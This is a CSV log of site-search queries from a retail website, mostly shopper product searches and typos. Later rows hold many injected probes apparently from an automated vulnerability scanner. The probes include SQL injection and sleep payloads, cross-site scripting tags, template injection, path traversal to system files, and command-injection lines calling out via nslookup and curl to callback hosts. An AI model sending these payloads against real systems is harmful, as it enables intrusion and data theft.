query_text,num_results,popularity,updated_at
"Women's Slippers, B-4, Silver",1,2,2021-02-18 11:39:33
"Women's Slippers, C-2, Purple",1,2,2021-02-18 11:45:12
"Twin Baby Round Cap, Off White",1,2,2021-02-18 11:47:16
avser,3,1,2021-02-25 12:38:01
avsar,0,26,2021-02-25 12:39:46
towel,20,12,2021-02-25 12:39:01
games,29,4,2021-03-01 11:52:56
conc,305,1,2021-03-12 09:53:53
conceale,191,1,2021-03-12 09:53:54
concealer,94,11,2021-03-12 12:50:21
foundc,9,1,2021-03-12 12:50:35
foundcealer,9,2,2021-03-12 12:50:44
cream,899,2,2021-11-12 11:21:02
Nikai Vacuum,2,2,2021-04-02 14:02:58
7880,2,1,2021-04-02 14:03:48
Silk,348,4,2021-05-19 12:39:11
burn,33,6,2021-05-19 12:39:11
bubble,16,2,2021-05-19 12:39:11
,13401,1,2021-07-09 11:30:36
pigeon,99,275,2021-07-09 11:30:36
jonsons,0,1,2021-05-31 05:44:12
johnsons,61,1,2021-05-31 05:44:27
ogx,54,19,2021-05-31 05:48:55
huda,11,1,2021-05-31 05:49:14
rimmel,184,2,2021-06-10 06:31:26
rica,107,1,2021-06-10 06:39:36
johnsons and johnsons,23,1,2021-06-10 07:22:29
P,6935,2,2021-07-09 11:30:36
lu buscuit,0,6,2021-07-09 11:30:36
lu,2313,6,2021-07-09 11:30:36
zeera,10,2,2021-07-09 11:30:36
lu biscuit,34,7,2021-07-09 11:30:36
ticky,31,14,2021-07-09 11:30:36
peanut maaza,0,4,2021-07-09 11:30:36
peanut,24,7,2021-07-09 11:30:36
meethi,2,4,2021-07-09 11:30:36
Mercury Gym Cut-In Tee Vest Small White,0,1,2021-06-28 09:03:45
Mercury Gym Cut-In Tee Vest,0,1,2021-06-28 09:03:49
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
,13381,1,2021-07-09 11:30:36
Olay+lotion,0,4,2021-07-09 11:30:36
mandarin,78,3,2021-07-09 11:30:36
Khatir Tawaza Vegetable Sprin,0,1,2021-07-05 10:24:30
Khatir Tawaza Vegetable,0,1,2021-07-05 10:24:33
Sauce,86,15,2021-07-09 11:30:36
energizer,19,3,2021-07-09 11:30:36
energizer light,17,3,2021-07-09 11:30:36
torch lights,0,2,2021-07-09 11:30:36
ketchup,30,14,2021-09-27 07:47:47
avent,146,77,2021-09-27 07:47:47
popcorn,30,10,2021-09-27 07:47:47
new,491,4,2021-09-27 07:47:47
shampoo,425,31,2021-09-27 07:47:47
sugar,118,14,2021-09-27 07:47:47
game,29,13,2021-09-27 07:47:47
fruit,387,16,2021-09-27 07:47:47
seeds,75,4,2021-09-27 07:47:47
mobile,5,48,2024-01-10 05:34:20
fghhjjjjkk,0,2,2021-09-27 07:47:47
fufhfhchchchdu,0,2,2021-09-27 07:47:47
yfufufuchc,0,2,2021-09-27 07:47:47
hib,19,2,2021-09-27 07:47:47
cart,308,1,2021-09-27 07:47:47
hhj,0,2,2021-09-27 07:47:47
hhjbhbbbhjjjjjjnjnjnhhh,0,2,2021-09-27 07:47:47
hhhhjjjj,0,4,2021-09-27 07:47:47
yujj,0,2,2021-09-27 07:47:47
car,966,2,2021-09-27 07:47:47
gshshshdbdn,0,2,2021-09-27 07:47:47
hdhndnd,0,2,2021-09-27 07:47:47
hdhjdhdndndnd,0,2,2021-09-27 07:47:47
hdhfhr,0,2,2021-09-27 07:47:47
nfjdjd,0,2,2021-09-27 07:47:47
zero,22,3,2021-09-27 07:47:47
white,506,2,2021-09-27 07:47:47
green,228,2,2021-09-27 07:47:47
shoes,43,2,2021-09-27 07:47:47
biscuit,86,4,2021-09-27 07:47:47
salt,73,6,2021-09-27 07:47:47
Pepsi,23,35,2021-09-27 07:47:47
Noodles,20,4,2021-09-27 07:47:47
iphone,6,4,2021-09-27 07:47:47
perfume,499,2,2021-09-27 07:47:47
bls know,0,2,2021-09-27 07:47:47
hair color,392,4,2021-09-27 07:47:47
tomme,77,8,2021-09-30 10:58:09
blender,451,4,2021-09-30 10:58:09
ogx biotin,2,8,2021-09-30 10:58:09
body shop shea butter,6,6,2021-09-30 10:58:09
clarins,82,2,2021-10-04 10:19:46
Pampers,101,2,2021-10-04 10:19:46
Pep,150,14,2021-10-04 10:19:46
Mut,26,1,2021-10-04 10:19:46
lotion,148,2,2021-10-04 10:19:46
milk,319,2,2021-10-04 10:19:46
blaxk,0,2,2021-10-04 10:19:46
biscuits,87,4,2021-10-04 10:19:46
feeder,97,11,2021-10-04 10:19:46
naheed,171,3,2021-10-04 10:19:46
almond,73,2,2021-10-04 10:19:46
croissant,8,1,2021-10-05 11:28:50
Maybelline,219,13,2021-10-22 06:43:06
Pam,59,7,2021-10-22 06:43:06
Randomtwxtednty,0,1,2021-10-22 06:43:06
Jazz,3,10,2021-10-22 06:43:06
aukey,20,15,2024-04-29 08:22:06
timex,79,5,2021-10-22 06:43:06
men watch,93,14,2021-10-22 06:43:06
panasonic,42,5,2021-11-18 07:45:04
philips,89,4,2021-11-18 07:45:04
Lad,131,2,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
,13742,1,2021-11-18 07:45:04
Watches,91,5,2021-11-18 07:45:04
Pap,22,1,2021-11-18 07:45:04
99%,303,2,2021-11-18 07:45:04
watar 200ml,0,2,2021-11-18 07:45:04
Av,1840,3,2021-11-18 07:45:04
fresh street,1,7,2021-11-18 07:45:04
manosalwa,0,1,2021-11-12 10:25:05
loreal professional,33,1,2021-11-12 10:25:59
"MAC Lightful C  Coral Grass Vibrancy Eye Cream, 30ml",0,1,2021-11-12 11:20:51
"Coral Grass Vibrancy Eye Cream, 30ml",0,1,2021-11-12 11:20:58
Coral Grass Vibrancy Eye Cream,0,1,2021-11-12 11:21:01
Tyy,0,2,2022-07-21 12:48:36
G,4726,3,2022-07-21 12:48:36
Mhj,0,1,2022-07-21 12:48:36
Jajjs,0,1,2022-07-21 12:48:36
Hahs,14,1,2022-07-21 12:48:36
Oran,385,3,2022-07-21 12:48:36
Watch,116,6,2022-07-21 12:48:36
Jewwl,0,2,2022-07-21 12:48:36
Papmers,0,1,2022-07-21 12:48:36
mob,6,1,2022-05-30 05:40:14
tcl,6,2,2022-07-21 12:48:36
kitchen,73,2,2022-07-21 12:48:36
led tv,6,16,2022-07-21 12:48:36
tv,34,3,2022-07-21 12:48:36
Prince,19,2,2022-07-21 12:48:36
pharma,2,1,2022-07-22 06:16:46
coach,10,2,2022-10-19 10:48:51
naheed.pk,0,1,2022-10-19 10:48:43
ic-1183597,1,1,2023-06-19 09:36:38
CP-10001,0,7,2023-10-06 14:06:24
Sockoye Sports Socks SP Pink,0,2,2023-10-06 14:13:26
sockoye,0,2,2023-10-06 14:14:05
snow socks,0,1,2023-10-06 14:09:43
Sockoye Sports,0,2,2023-10-06 14:13:17
Sockoye Sports Socks SP,0,1,2023-10-06 14:13:45
lays,317,1,2023-10-10 06:56:52
lays wavy,1,1,2023-10-10 06:57:02
straightner,32,2,2023-12-22 07:07:54
panadol,0,2,2023-12-22 07:07:54
straightener,43,2,2023-12-22 07:07:54
perfumes,372,134,2024-05-23 04:50:19
Samosa,17,3,2024-05-23 04:50:19
condom,28,1,2024-05-23 04:50:19
infinix y1 laptop,0,4,2024-05-23 04:50:19
Aukey Slim Power Bank 5000mAh,1,5,2024-05-23 04:50:19
heandfree,0,1,2024-05-23 04:50:19
ddfdffd,0,3,2024-05-23 04:50:19
xxx,0,1,2024-05-23 04:50:19
55,537,1,2024-05-23 04:50:19
dsd,3,1,2024-05-23 04:50:19
zzzzzzz,0,1,2024-05-23 04:50:19
kk,41,1,2024-05-23 04:50:19
ll,3978,1,2024-05-23 04:50:19
bsns,1,1,2024-05-23 04:50:19
hsd,0,1,2024-05-23 04:50:19
jj,0,1,2024-05-23 04:50:19
h,4455,1,2024-05-23 04:50:19
shjs,0,1,2024-05-23 04:50:19
isi,330,1,2024-05-23 04:50:19
Lipsticks,1053,17,2024-05-23 04:50:19
f,6003,1,2024-05-23 04:50:19
Suzuki car,0,1,2024-05-23 04:50:19
porn,0,4,2024-05-23 04:50:19
ass,609,4,2024-05-23 04:50:19
fuck,0,2,2024-05-23 04:50:19
face ,869,2,2024-05-23 04:50:19
look,734,2,2024-05-23 04:50:19
girl,331,2,2024-05-23 04:50:19
boy,46,2,2024-05-23 04:50:19
love,342,6,2024-05-23 04:50:19
Free-Perfume,0,1,2024-03-11 05:56:20
anker powerline,5,1,2024-04-29 08:22:35
"Anker PowerLine  Lightning Cable, 3ft Grey, A8121HA1",1,2,2024-04-29 08:24:47
stanley,0,1,2024-05-15 11:39:45
water,446,2,2024-05-20 07:51:06
test,2,3586,2024-06-12 00:03:42
{search_term_string},0,1,2024-06-10 15:59:21
${10000100+10000202},0,1,2024-06-10 15:59:22
),0,15,2024-06-12 02:48:49
{{41222*41222}},0,2,2024-06-10 15:59:25
../../../../../../../../../../../../../../etc/passwd,0,15,2024-06-12 02:49:11
"test<esi:include src=""http://bxss.me/rpb.png""/>",0,14,2024-06-11 23:56:49
http://dicrpdbjmemujemfyopp.zzz/yrphmgdpgulaszriylqiipemefmacafkxycjaxjs?.jpg,0,15,2024-06-12 02:49:03
response.write(9644270*9403124),0,1,2024-06-10 15:59:26
"echo ywubze$()\ aztjsu\nz^xyu||a #' &echo ywubze$()\ aztjsu\nz^xyu||a #|"" &echo ywubze$()\ aztjsu\nz^xyu||a #",0,1,2024-06-10 15:59:26
../../../../../../../../../../../../../../windows/win.ini,0,15,2024-06-12 02:49:14
'+response.write(9644270*9403124)+',0,1,2024-06-10 15:59:27
1o2QTCagO,0,1,2024-06-10 15:59:27
!(()&&!|*|*|,0,15,2024-06-12 02:48:53
test4k1NqGv3,0,1,2024-06-10 15:59:28
1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs .jpg,0,15,2024-06-12 02:49:08
"""+response.write(9644270*9403124)+""",0,1,2024-06-10 15:59:30
"&echo adtvim$()\ gncvqx\nz^xyu||a #' &echo adtvim$()\ gncvqx\nz^xyu||a #|"" &echo adtvim$()\ gncvqx\nz^xyu||a #",0,1,2024-06-10 15:59:32
HttP://bxss.me/t/xss.html?%00,0,15,2024-06-12 02:49:49
xfs.bxss.me,0,15,2024-06-12 02:50:24
Http://bxss.me/t/fit.txt,0,15,2024-06-12 02:49:17
^(#$!@#$)(()))******,0,15,2024-06-12 02:48:57
"test&echo gwizgm$()\ emvmvt\nz^xyu||a #' &echo gwizgm$()\ emvmvt\nz^xyu||a #|"" &echo gwizgm$()\ emvmvt\nz^xyu||a #",0,1,2024-06-10 15:59:34
924656,0,1,2024-06-10 15:59:34
bxss.me/t/xss.html?%00,0,15,2024-06-12 02:49:53
http://xfs.bxss.me?naheed.pk,0,15,2024-06-12 02:50:32
index.php,0,30,2024-06-12 02:50:09
"|echo fxsqav$()\ ujctvk\nz^xyu||a #' |echo fxsqav$()\ ujctvk\nz^xyu||a #|"" |echo fxsqav$()\ ujctvk\nz^xyu||a #",0,1,2024-06-10 15:59:36
"test|echo qanhik$()\ gpogfe\nz^xyu||a #' |echo qanhik$()\ gpogfe\nz^xyu||a #|"" |echo qanhik$()\ gpogfe\nz^xyu||a #",0,1,2024-06-10 15:59:37
http://bxss.me/t/fit.txt?.jpg,0,15,2024-06-12 02:49:25
(nslookup -q=cname hitublxpemzcee8e6f.bxss.me||curl hitublxpemzcee8e6f.bxss.me)),0,1,2024-06-10 15:59:39
"""+""A"".concat(70-3).concat(22*4).concat(121).concat(86).concat(121).concat(69)+(require""socket""
Socket.gethostbyname(""hitfm""+""oct",0,1,2024-06-10 15:59:39
/etc/shells,0,15,2024-06-12 02:49:39
test' AND 2*3*8=6*8 AND 'KYOJ'='KYOJ,0,1,2024-06-10 15:59:39
"'""",0,15,2024-06-12 02:50:26
file:///etc/passwd,0,15,2024-06-12 02:49:17
c:/windows/win.ini,0,15,2024-06-12 02:49:44
"test"" AND 2*3*8=6*8 AND ""crJ8""=""crJ8",0,1,2024-06-10 15:59:41
xfs.bxss.me?naheed.pk,0,15,2024-06-12 02:50:36
index.php/.,0,15,2024-06-12 02:50:13
bxss.me,0,15,2024-06-12 02:49:47
$(nslookup -q=cname hittarutthnpzeb252.bxss.me||curl hittarutthnpzeb252.bxss.me),0,1,2024-06-10 15:59:43
<!--,0,15,2024-06-12 02:50:29
//xfs.bxss.me?naheed.pk,0,15,2024-06-12 02:50:42
test%' AND 2*3*8=6*8 AND 'PTWI'!='PTWI%,0,1,2024-06-10 15:59:44
"&nslookup -q=cname hitcqaookkxnu34cde.bxss.me&'\""`0&nslookup -q=cname hitcqaookkxnu34cde.bxss.me&`'",0,1,2024-06-10 15:59:44
'.gethostbyname(lc('hitst'.'zarbbojxfb093.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(99).chr(75).chr(113).chr(77).',0,1,2024-06-10 15:59:45
"'+'A'.concat(70-3).concat(22*4).concat(114).concat(89).concat(116).concat(81)+(require'socket'
Socket.gethostbyname('hitlf'+'mod",0,1,2024-06-10 15:59:45
"test'""()&%<zzz><ScRiPt >pkF1(9123)</ScRiPt>",0,1,2024-06-10 15:59:45
-1 OR 2+872-872-1=0+0+0+1,0,1,2024-06-10 15:59:46
;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));,0,15,2024-06-12 02:51:19
"&(nslookup -q=cname hitwjaylnzfgs973c4.bxss.me||curl hitwjaylnzfgs973c4.bxss.me)&'\""`0&(nslookup -q=cname hitwjaylnzfgs973c4.bxs",0,1,2024-06-10 15:59:47
"'""()&%<zzz><ScRiPt >pkF1(9404)</ScRiPt>",0,1,2024-06-10 15:59:47
';print(md5(31337));$a=',0,15,2024-06-12 02:51:26
""".gethostbyname(lc(""hitqk"".""bqqjxkedbfce6.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(97).chr(72).chr(102).chr(73).""",0,1,2024-06-10 15:59:48
/\xfs.bxss.me?naheed.pk,0,15,2024-06-12 02:50:47
|(nslookup -q=cname hitrskhpdrmdb9d067.bxss.me||curl hitrskhpdrmdb9d067.bxss.me),0,1,2024-06-10 15:59:49
`(nslookup -q=cname hitbfremgfbhkae048.bxss.me||curl hitbfremgfbhkae048.bxss.me)`,0,1,2024-06-10 15:59:50
"'""()",0,15,2024-06-12 02:52:49
-1 OR 3+872-872-1=0+0+0+1,0,1,2024-06-10 15:59:51
test'&&sleep(27*1000)*bfcesk&&',0,1,2024-06-10 15:59:52
""";print(md5(31337));$a=""",0,15,2024-06-12 02:51:30
test'||',0,13,2024-06-12 00:04:21
test9486314,0,1,2024-06-10 15:59:53
"test""&&sleep(27*1000)*wyxvyp&&""",0,1,2024-06-10 15:59:53
;(nslookup -q=cname hitcmjkbzfhhq510f4.bxss.me||curl hitcmjkbzfhhq510f4.bxss.me)|(nslookup -q=cname hitcmjkbzfhhq510f4.bxss.me||,0,1,2024-06-10 15:59:53
test9486314<,0,1,2024-06-10 15:59:54
test'||sleep(27*1000)*dwhfsg||',9,1,2024-06-10 15:59:55
"if(now()=sysdate(),sleep(15),0)",0,13,2024-06-12 00:06:50
../test,0,14,2024-06-11 23:57:40
bfg5831＜s1﹥s2ʺs3ʹhjl5831,0,1,2024-06-10 15:59:56
"test0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",0,13,2024-06-12 00:09:01
"test""||sleep(27*1000)*ghuhoy||""",13,1,2024-06-10 15:59:57
bfgx9168??z1??z2a?bcxhjl9168,0,1,2024-06-10 15:59:57
./test,0,14,2024-06-11 23:57:48
"test0""XOR(if(now()=sysdate(),sleep(15),0))XOR""Z",0,14,2024-06-12 00:11:39
${@print(md5(31337))},0,15,2024-06-12 02:51:36
<%={{={@{#{${dfb}}%>,0,67,2024-06-12 02:59:21
"(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'""+(select(0)from(select(sleep(15)))v)+""*/",0,13,2024-06-12 00:15:21
${@print(md5(31337))}\,0,15,2024-06-12 02:51:42
"<th:t=""${dfb}#foreach",0,67,2024-06-12 02:59:27
'.print(md5(31337)).',0,15,2024-06-12 02:51:45
"1}}""}}'}}1%>""%>'%><%={{={@{#{${dfb}}%>",0,67,2024-06-12 02:59:32
dfb{{98991*97996}}xca,0,67,2024-06-12 02:59:37
dfb[[${98991*97996}]]xca,0,67,2024-06-12 02:59:46
test-1 waitfor delay '0:0:15' --,0,14,2024-06-12 00:17:39
dfb__${98991*97996}__::.x,0,66,2024-06-12 02:58:54
testQlR8f7FL'; waitfor delay '0:0:15' --,0,1,2024-06-10 16:00:11
"""dfbzzzzzzzzbbbccccdddeeexca"".replace(""z"",""o"")",0,66,2024-06-12 02:59:10
bfg3363＜s1﹥s2ʺs3ʹhjl3363,0,1,2024-06-10 16:00:15
test2vCQyVSf' OR 326=(SELECT 326 FROM PG_SLEEP(15))--,0,1,2024-06-10 16:00:17
bfgx9694??z1??z2a?bcxhjl9694,0,1,2024-06-10 16:00:17
testvRgkO7HL') OR 374=(SELECT 374 FROM PG_SLEEP(15))--,0,1,2024-06-10 16:00:23
testtKNuYCfF')) OR 146=(SELECT 146 FROM PG_SLEEP(15))--,0,1,2024-06-10 16:00:26
"test'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'",0,14,2024-06-12 00:28:55
"test'""",0,14,2024-06-12 00:28:58
"test????%2527%2522\'\""",0,14,2024-06-12 00:29:08
@@pVA9M,0,1,2024-06-10 16:00:33
bfg10419＜s1﹥s2ʺs3ʹhjl10419,0,1,2024-06-10 16:00:42
bfgx8152??z1??z2a?bcxhjl8152,0,1,2024-06-10 16:00:45
bfg6543＜s1﹥s2ʺs3ʹhjl6543,0,1,2024-06-10 16:01:21
bfgx8231??z1??z2a?bcxhjl8231,0,1,2024-06-10 16:01:24
bfg1885＜s1﹥s2ʺs3ʹhjl1885,0,1,2024-06-10 16:01:49
bfgx6069??z1??z2a?bcxhjl6069,0,1,2024-06-10 16:01:51
bfg5897＜s1﹥s2ʺs3ʹhjl5897,0,1,2024-06-10 16:02:05
bfgx5631??z1??z2a?bcxhjl5631,0,1,2024-06-10 16:02:15
test</title><ScRiPt >pkF1(9288)</ScRiPt>,0,1,2024-06-10 16:02:40
"test9055""();}]9975",0,1,2024-06-10 16:02:42
%74%65%73%74%39%31%31%37%22%28%29%3B%7D%5D%39%39%33%36,0,1,2024-06-10 16:02:43
test</script><script>pkF1(9171)</script>,0,1,2024-06-10 16:02:45
"test""onmouseover=pkF1(99902)""",0,1,2024-06-10 16:02:49
"test""onmouseover=pkF1(96152)""",0,1,2024-06-10 16:02:53
"test"" st0P=pkF1([!+!]) TbH=""",0,1,2024-06-10 16:02:56
test\u0022onmouseover=pkF1(98313)\u0022,0,1,2024-06-10 16:02:58
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%70%6B%46%31%28%39%38%30%32%34%29%22,0,1,2024-06-10 16:03:00
"?""onmouseover=pkF1(99055)//",0,1,2024-06-10 16:03:01
"test""sTYLe='zzz:Expre/**/SSion(pkF1(9230))'bad=""",0,1,2024-06-10 16:03:02
"test""><script>pkF1(9252)</script>",0,1,2024-06-10 16:03:04
test<ScRiPt >pkF1(9888)</ScRiPt>,0,1,2024-06-10 16:03:06
test<WIND9L>BEE7M[!+!]</WIND9L>,0,1,2024-06-10 16:03:08
test<script>pkF1(9066)</script>,0,1,2024-06-10 16:03:09
test<script>pkF1(9542)</script>9542,0,1,2024-06-10 16:03:10
test<ScR<ScRiPt>IpT>pkF1(9851)</sCr<ScRiPt>IpT>,0,1,2024-06-10 16:03:12
"test<ScRiPt 
>pkF1(9451)</ScRiPt>",0,1,2024-06-10 16:03:13
test<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9525></ScRiPt>,0,1,2024-06-10 16:03:15
"test< ScRiPt 
>pkF1(9217)</ScRiPt>",0,1,2024-06-10 16:03:20
"test<svg	
? onload=pkF1(9553);>",0,1,2024-06-10 16:03:22
test<isindex type=image src=1 onerror=pkF1(9766)>,0,1,2024-06-10 16:03:23
"test<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9557'>",0,1,2024-06-10 16:03:25
test<body onload=pkF1(9352)>,0,1,2024-06-10 16:03:27
test<img src=//xss.bxss.me/t/dot.gif onload=pkF1(9749)>,0,1,2024-06-10 16:03:29
test<img src=xyz OnErRor=pkF1(9354)>,0,1,2024-06-10 16:03:31
"test<img/src="">"" onerror=alert(9863)>",0,1,2024-06-10 16:03:37
%74%65%73%74%3C%53%63%52%69%50%74%20%3E%70%6B%46%31%289706%29%3C%2F%73%43%72%69%70%54%3E,0,1,2024-06-10 16:03:41
test\u003CScRiPt\pkF1(9523)\u003C/sCripT\u003E,0,1,2024-06-10 16:03:43
test&lt;ScRiPt&gt;pkF1(9747)&lt;/sCripT&gt;,0,1,2024-06-10 16:03:44
?<img zzz onmouseover=pkF1(99681) //?>,0,1,2024-06-10 16:03:45
test<input autofocus onfocus=pkF1(9139)>,0,1,2024-06-10 16:03:53
<a HrEF=http://xss.bxss.me></a>,0,7,2024-06-12 00:10:59
<a HrEF=jaVaScRiPT:>,0,7,2024-06-12 00:11:17
test}body{zzz:Expre/**/SSion(pkF1(9385))},0,1,2024-06-10 16:04:04
"testEkpNt
<ScRiPt >pkF1(9217)</ScRiPt>",0,1,2024-06-10 16:04:10
test<W0DAUN>OBFGP[!+!]</W0DAUN>,0,1,2024-06-10 16:04:13
test<ifRAme sRc=9402.com></IfRamE>,0,1,2024-06-10 16:04:15
test<aXOncWq x=9877>,0,1,2024-06-10 16:04:17
test<img sRc='http://attacker-9051/log.php?,0,1,2024-06-10 16:04:20
test<azhmBXH<,0,1,2024-06-10 16:04:24
1oVLqvGlO,0,1,2024-06-10 16:12:30
{{11613*11613}},0,2,2024-06-10 16:12:33
${9999293+10000407},0,1,2024-06-10 16:12:35
response.write(9227992*9376295),0,1,2024-06-10 16:12:40
"echo zctmfk$()\ jlqtpz\nz^xyu||a #' &echo zctmfk$()\ jlqtpz\nz^xyu||a #|"" &echo zctmfk$()\ jlqtpz\nz^xyu||a #",0,1,2024-06-10 16:12:41
'+response.write(9227992*9376295)+',0,1,2024-06-10 16:12:41
"&echo tavcme$()\ uosyew\nz^xyu||a #' &echo tavcme$()\ uosyew\nz^xyu||a #|"" &echo tavcme$()\ uosyew\nz^xyu||a #",0,1,2024-06-10 16:12:43
"""+response.write(9227992*9376295)+""",0,1,2024-06-10 16:12:43
"test&echo dcrpho$()\ bqvcux\nz^xyu||a #' &echo dcrpho$()\ bqvcux\nz^xyu||a #|"" &echo dcrpho$()\ bqvcux\nz^xyu||a #",0,1,2024-06-10 16:12:44
"""+""A"".concat(70-3).concat(22*4).concat(120).concat(87).concat(104).concat(73)+(require""socket""
Socket.gethostbyname(""hitkb""+""iqq",0,1,2024-06-10 16:12:45
"|echo orkmpq$()\ zzgpqh\nz^xyu||a #' |echo orkmpq$()\ zzgpqh\nz^xyu||a #|"" |echo orkmpq$()\ zzgpqh\nz^xyu||a #",0,1,2024-06-10 16:12:46
957425,0,1,2024-06-10 16:12:47
"test|echo dlrbqn$()\ rnhrsy\nz^xyu||a #' |echo dlrbqn$()\ rnhrsy\nz^xyu||a #|"" |echo dlrbqn$()\ rnhrsy\nz^xyu||a #",0,1,2024-06-10 16:12:48
"'+'A'.concat(70-3).concat(22*4).concat(121).concat(66).concat(105).concat(82)+(require'socket'
Socket.gethostbyname('hitgn'+'rkb",0,1,2024-06-10 16:12:49
(nslookup -q=cname hitsjqabcjcgxdd8e7.bxss.me||curl hitsjqabcjcgxdd8e7.bxss.me)),0,1,2024-06-10 16:12:49
"test'""()&%<zzz><ScRiPt >F0Cb(9972)</ScRiPt>",0,1,2024-06-10 16:12:51
$(nslookup -q=cname hitxunbshdpfs71599.bxss.me||curl hitxunbshdpfs71599.bxss.me),0,1,2024-06-10 16:12:51
